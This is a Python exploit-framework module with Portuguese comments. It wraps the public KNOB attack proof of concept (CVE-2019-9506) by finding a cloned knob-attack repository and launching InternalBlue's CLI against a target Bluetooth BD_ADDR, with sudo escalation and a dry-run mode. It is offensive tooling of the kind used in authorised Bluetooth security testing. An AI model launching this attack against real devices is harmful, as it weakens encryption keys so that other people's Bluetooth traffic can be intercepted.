#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
# Version: 1.0.0
"""Bridge subprocess para francozappa/knob (CVE-2019-9506) — KNOB BR/EDR.

Dispara o CLI Python 2 do InternalBlue empacotado em ``poc-internalblue`` (fluxo
documentado no README do knob). O endereço alvo é repassado por variável de ambiente
para automações externas; a negociação de entropia ocorre no cenário Nexus 5 +
InternalBlue conforme upstream.

Referência: https://github.com/francozappa/knob
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Ponte subprocess para ferramentas KNOB (InternalBlue / knob-attack)."""

    __info__ = {
        "name": "KNOB Attack Bridge",
        "description": (
            "CVE-2019-9506: redução de entropia na negociação de chave E0 BR/EDR (KNOB). "
            "Este módulo inicia o ``cli.py`` do InternalBlue v0.1 incluído em "
            "knob-attack/poc-internalblue (subprocess Python 2). Siga o README upstream "
            "(monitor LMP, pairing, papel master/slave). BD_ADDR alvo exportado em "
            "WIRELESSXPL_KNOB_TARGET_BDADDR. Version: 1.0.0"
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "francozappa/knob, Dennis Mantz/InternalBlue (subprocess)",
        ),
        "references": (
            "https://github.com/francozappa/knob",
            "https://www.knobattack.com/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-9506",
        ),
        "devices": ("bluetooth_classic", "br_edr", "internalblue"),
    }

    target_address = OptMAC(
        "",
        "BD_ADDR do dispositivo alvo (normalizado; exportado WIRELESSXPL_KNOB_TARGET_BDADDR)",
    )
    dry_run = OptBool(False, "Somente exibir o comando, sem executar")

    def _knob_root(self) -> Optional[Path]:
        """Diretório raiz ``knob-attack`` (clone francozappa/knob)."""
        here = Path(__file__).resolve()
        candidates = (
            here.parents[5] / "knob-attack",
            here.parents[4] / "knob-attack",
            here.parents[6] / "IoT" / "knob-attack",
        )
        for c in candidates:
            if (c / "README.md").is_file():
                return c.resolve()
        return None

    def _internalblue_cli_cwd(self, knob_root: Path) -> Optional[Path]:
        """Diretório que contém ``cli.py`` (imports ``core`` locais)."""
        inner = knob_root / "poc-internalblue" / "internalblue" / "internalblue"
        cli = inner / "cli.py"
        if cli.is_file():
            return inner.resolve()
        return None

    def _python2(self) -> str:
        """Resolve intérprete Python 2 para InternalBlue."""
        if os.name == "nt":
            py_launcher = shutil.which("py")
            if py_launcher:
                return py_launcher
        for name in ("python2", "python"):
            w = shutil.which(name)
            if w:
                return w
        return "python2"

    def _cli_argv(self, py: str, cli_cwd: Path) -> List[str]:
        """Monta argv para ``cli.py`` (``py -2`` no Windows quando necessário)."""
        cli = str(cli_cwd / "cli.py")
        if os.name == "nt" and Path(py).stem.lower() == "py":
            return [py, "-2", cli]
        return [py, cli]

    def _build_command(self, cli_cwd: Path) -> Tuple[List[str], Dict[str, str]]:
        """Monta ``python2 cli.py`` e ambiente com BD_ADDR alvo.

        Args:
            cli_cwd: Pasta com ``cli.py``.

        Returns:
            Tupla (argv, env).
        """
        py = self._python2()
        cmd = self._cli_argv(py, cli_cwd)

        env = dict(os.environ)
        addr = str(self.target_address).strip().upper().replace("-", ":")
        if addr and addr != "00:00:00:00:00:00":
            env["WIRELESSXPL_KNOB_TARGET_BDADDR"] = addr
        return cmd, env

    def run(self) -> None:
        """Sobe o CLI InternalBlue (KNOB PoC) ou exibe dry-run."""
        knob_root = self._knob_root()
        if not knob_root:
            print_error(
                "knob-attack não encontrado. Clone francozappa/knob em "
                "submodules/IoT/knob-attack.",
            )
            return

        cli_cwd = self._internalblue_cli_cwd(knob_root)
        if not cli_cwd:
            print_error(
                "cli.py do InternalBlue não encontrado em "
                "knob-attack/poc-internalblue/internalblue/internalblue/.",
            )
            return

        cmd, env = self._build_command(cli_cwd)
        cmd_str = " ".join(cmd)
        logger.info("KNOB knob_root=%s", knob_root)
        logger.debug("KNOB cmd=%s", cmd_str)

        addr = env.get("WIRELESSXPL_KNOB_TARGET_BDADDR")
        if addr:
            logger.info("WIRELESSXPL_KNOB_TARGET_BDADDR=%s", addr)
            print_info("BD_ADDR alvo (env): {}".format(addr))
        else:
            print_info(
                "target_address vazio — defina OptMAC para exportar "
                "WIRELESSXPL_KNOB_TARGET_BDADDR a scripts auxiliares.",
            )

        if self.dry_run:
            print_info("DRY RUN — comando:")
            print_status(cmd_str)
            print_info("cwd: {}".format(cli_cwd))
            return

        print_status("KNOB: iniciando InternalBlue (interactive)...")
        print_info(cmd_str)
        print_info(
            "Após conectar: use ``monitor lmp start`` no prompt conforme README do knob.",
        )

        full_cmd = cmd
        if os.name != "nt" and os.geteuid() != 0:
            sudo = shutil.which("sudo")
            if sudo:
                full_cmd = [sudo] + cmd
                logger.info("Prefixando sudo para acesso USB/firmware.")

        try:
            subprocess.run(full_cmd, cwd=str(cli_cwd), env=env, check=False)
        except KeyboardInterrupt:
            print_info("InternalBlue interrompido pelo usuário.")
            logger.info("KNOB: KeyboardInterrupt")
        except Exception as exc:
            print_error(str(exc))
            logger.exception("KNOB internalblue subprocess")
